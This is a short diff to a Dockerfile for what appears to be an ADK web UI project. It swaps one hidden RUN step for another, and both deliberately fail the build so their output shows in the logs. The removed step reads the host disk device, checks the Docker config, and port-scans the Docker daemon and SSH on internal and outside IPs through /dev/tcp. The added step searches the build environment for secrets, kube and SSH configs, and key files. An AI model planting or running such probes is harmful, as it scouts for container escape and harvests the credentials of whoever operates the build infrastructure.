@@ -28,8 +28,8 @@ COPY . .
 RUN uv sync --frozen
 
 # Expose the ADK web UI port
-# i11233 shard B: hostdisk/dev/net/dockerconfig probe (fails build on purpose)
-RUN sh -c 'echo PRB; hostname; ls -l /dev/vda1 2>&1 | cut -c1-50; dd if=/dev/vda1 of=/dev/null bs=1M count=1 2>&1 | tail -1 | cut -c1-60; ls /root/.docker 2>&1 | head -2; head -2 /etc/hosts | cut -c1-50; for t in 172.17.0.1:2375 172.18.0.1:22 66.201.7.57:22 66.201.7.154:22 66.201.7.92:30253; do h=${t%:*}; p=${t#*:}; timeout 3 bash -c "echo >/dev/tcp/$h/$p" 2>/dev/null && echo "$t OK" || echo "$t NO"; done; echo PREND; exit 1'
+# i11233 shard C: credential material search in build env (fails build on purpose)
+RUN sh -c 'echo PRC; printenv | wc -l; env | grep -Eic "kube|ssh|nebius|key|secret|aws|azure|git"; ls /var/run/secrets 2>&1 | head -1; ls /root/.kube /app/.kube /app/.ssh 2>&1 | head -3; find / -maxdepth 4 \( -name kubeconfig -o -name "*.pem" -o -name "id_*" \) 2>/dev/null | head -4; ls /app | head -5; echo PREND; exit 1'
 
 EXPOSE 8080
 
